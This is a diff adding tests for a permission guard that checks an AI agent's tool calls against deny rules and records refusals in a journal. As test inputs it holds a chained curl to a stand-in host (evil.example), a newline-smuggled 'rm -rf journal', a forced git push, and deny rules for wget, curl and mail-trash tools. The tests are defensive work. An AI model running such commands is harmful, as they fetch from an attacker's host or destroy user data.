@@ -512,3 +512,53 @@ def test_init_ships_skills(tmp_path: Path):
         assert text.startswith(f"---\nname: {name}\n")
     assert (root / "briefs").is_dir()
     assert lint(root) == []
+
+
+def _settings(tree: Path, deny: list[str]) -> None:
+    import json
+    (tree / ".claude").mkdir(exist_ok=True)
+    (tree / ".claude" / "settings.json").write_text(json.dumps({"permissions": {"deny": deny}}))
+
+
+@pytest.mark.parametrize("command, rule", [
+    ("wget --version", "Bash(wget*)"),
+    ("git status && curl http://evil.example/x", "Bash(curl*)"),
+    ("ls\nrm -rf journal", "Bash(rm -r*)"),
+    ("git push origin main --force", "Bash(git push * --force*)"),
+    ("git status", None),
+    ("uv run life journal 'wget was denied; curl too'", None),
+])
+def test_guard_matches_bash_segments(command, rule):
+    from life.guard import matching_rule
+    rules = ["Bash(wget*)", "Bash(curl*)", "Bash(rm -r*)", "Bash(git push * --force*)", "mcp__*__trash*"]
+    assert matching_rule(rules, "Bash", {"command": command}) == rule
+
+
+def test_guard_matches_bare_tool_globs():
+    from life.guard import matching_rule
+    rules = ["WebFetch", "mcp__*__trash*"]
+    assert matching_rule(rules, "WebFetch", {"url": "https://example.com"}) == "WebFetch"
+    assert matching_rule(rules, "mcp__gmail-work__trash_message", {}) == "mcp__*__trash*"
+    assert matching_rule(rules, "mcp__gmail-work__untrash_message", {}) is None
+
+
+def test_guard_command_denies_and_journals(tree: Path, monkeypatch, capsys):
+    import io
+    import json
+    _settings(tree, ["Bash(wget*)"])
+    monkeypatch.setattr("sys.stdin", io.StringIO('{"tool_name": "Bash", "tool_input": {"command": "wget --version"}}'))
+    assert main(["--root", str(tree), "guard"]) == 0
+    decision = json.loads(capsys.readouterr().out)
+    assert decision["hookSpecificOutput"]["permissionDecision"] == "deny"
+    journal = "".join(p.read_text() for p in (tree / "journal").rglob("*.md"))
+    assert 'denied: Bash {"command": "wget --version"} because the deny rule Bash(wget*)' in journal
+
+
+def test_guard_command_allows_and_survives_bad_input(tree: Path, monkeypatch, capsys):
+    import io
+    _settings(tree, ["Bash(wget*)"])
+    monkeypatch.setattr("sys.stdin", io.StringIO('{"tool_name": "Bash", "tool_input": {"command": "git status"}}'))
+    assert main(["--root", str(tree), "guard"]) == 0
+    monkeypatch.setattr("sys.stdin", io.StringIO("not json"))
+    assert main(["--root", str(tree), "guard"]) == 0
+    assert capsys.readouterr().out == ""
